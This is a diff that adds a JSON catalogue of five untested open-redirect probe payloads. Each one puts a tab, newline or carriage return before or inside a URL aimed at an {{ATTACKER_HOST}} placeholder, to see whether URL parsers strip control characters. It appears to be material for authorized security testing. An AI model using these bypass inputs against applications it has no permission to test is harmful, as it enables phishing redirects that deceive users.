@@ -1,0 +1,138 @@
+{
+  "name": "raw_control_transport_probes",
+  "record_type": "raw_control_transport_probe",
+  "count": 5,
+  "note": "Classification only; records remain untested unless explicitly documented otherwise.",
+  "records": [
+    {
+      "id": "ORX-0041",
+      "payload": "\thttps://{{ATTACKER_HOST}}/",
+      "families": [
+        "url_parser_control_character"
+      ],
+      "sources": [
+        "open_redirect_pack_v2_authored_extension"
+      ],
+      "templated_payload": "\thttps://{{ATTACKER_HOST}}/",
+      "technique": "leading-tab",
+      "context": "query-parameter-url-value",
+      "hypothesis": "Tests tab stripping; send as encoded query data rather than a raw HTTP request-line control.",
+      "status": "untested",
+      "confidence": "candidate",
+      "classification_note": "Candidate test input only. Results depend on the target framework, backend parser, decoding pipeline and browser URL parser; not a confirmed bypass.",
+      "record_type": "raw_control_transport_probe",
+      "review_status": "classified_unverified",
+      "triage_note": "Contains literal control bytes; requires a dedicated raw/encoded transport experiment.",
+      "runtime_value": "\thttps://{{ATTACKER_HOST}}/",
+      "transport_profile": "raw-control-special-case",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "ORX-0042",
+      "payload": "\nhttps://{{ATTACKER_HOST}}/",
+      "families": [
+        "url_parser_control_character"
+      ],
+      "sources": [
+        "open_redirect_pack_v2_authored_extension"
+      ],
+      "templated_payload": "\nhttps://{{ATTACKER_HOST}}/",
+      "technique": "leading-newline",
+      "context": "query-parameter-url-value",
+      "hypothesis": "Tests newline handling in application-level decoding; never inject a raw line break into the HTTP request line.",
+      "status": "untested",
+      "confidence": "candidate",
+      "classification_note": "Candidate test input only. Results depend on the target framework, backend parser, decoding pipeline and browser URL parser; not a confirmed bypass.",
+      "record_type": "raw_control_transport_probe",
+      "review_status": "classified_unverified",
+      "triage_note": "Contains literal control bytes; requires a dedicated raw/encoded transport experiment.",
+      "runtime_value": "\nhttps://{{ATTACKER_HOST}}/",
+      "transport_profile": "raw-control-special-case",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "ORX-0043",
+      "payload": "\rhttps://{{ATTACKER_HOST}}/",
+      "families": [
+        "url_parser_control_character"
+      ],
+      "sources": [
+        "open_redirect_pack_v2_authored_extension"
+      ],
+      "templated_payload": "\rhttps://{{ATTACKER_HOST}}/",
+      "technique": "leading-carriage-return",
+      "context": "query-parameter-url-value",
+      "hypothesis": "Tests CR handling after application decoding; transport-encode it.",
+      "status": "untested",
+      "confidence": "candidate",
+      "classification_note": "Candidate test input only. Results depend on the target framework, backend parser, decoding pipeline and browser URL parser; not a confirmed bypass.",
+      "record_type": "raw_control_transport_probe",
+      "review_status": "classified_unverified",
+      "triage_note": "Contains literal control bytes; requires a dedicated raw/encoded transport experiment.",
+      "runtime_value": "\rhttps://{{ATTACKER_HOST}}/",
+      "transport_profile": "raw-control-special-case",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "ORX-0044",
+      "payload": "https://{{ATTACKER_HOST}}\t/",
+      "families": [
+        "url_parser_control_character"
+      ],
+      "sources": [
+        "open_redirect_pack_v2_authored_extension"
+      ],
+      "templated_payload": "https://{{ATTACKER_HOST}}\t/",
+      "technique": "embedded-tab",
+      "context": "query-parameter-url-value",
+      "hypothesis": "Tests embedded tab removal in URL parsing.",
+      "status": "untested",
+      "confidence": "candidate",
+      "classification_note": "Candidate test input only. Results depend on the target framework, backend parser, decoding pipeline and browser URL parser; not a confirmed bypass.",
+      "record_type": "raw_control_transport_probe",
+      "review_status": "classified_unverified",
+      "triage_note": "Contains literal control bytes; requires a dedicated raw/encoded transport experiment.",
+      "runtime_value": "https://{{ATTACKER_HOST}}\t/",
+      "transport_profile": "raw-control-special-case",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "ORX-0045",
+      "payload": "https://{{ATTACKER_HOST}}\n/",
+      "families": [
+        "url_parser_control_character"
+      ],
+      "sources": [
+        "open_redirect_pack_v2_authored_extension"
+      ],
+      "templated_payload": "https://{{ATTACKER_HOST}}\n/",
+      "technique": "embedded-newline",
+      "context": "query-parameter-url-value",
+      "hypothesis": "Tests embedded newline removal in URL parsing; transport-encode it.",
+      "status": "untested",
+      "confidence": "candidate",
+      "classification_note": "Candidate test input only. Results depend on the target framework, backend parser, decoding pipeline and browser URL parser; not a confirmed bypass.",
+      "record_type": "raw_control_transport_probe",
+      "review_status": "classified_unverified",
+      "triage_note": "Contains literal control bytes; requires a dedicated raw/encoded transport experiment.",
+      "runtime_value": "https://{{ATTACKER_HOST}}\n/",
+      "transport_profile": "raw-control-special-case",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    }
+  ]
+}
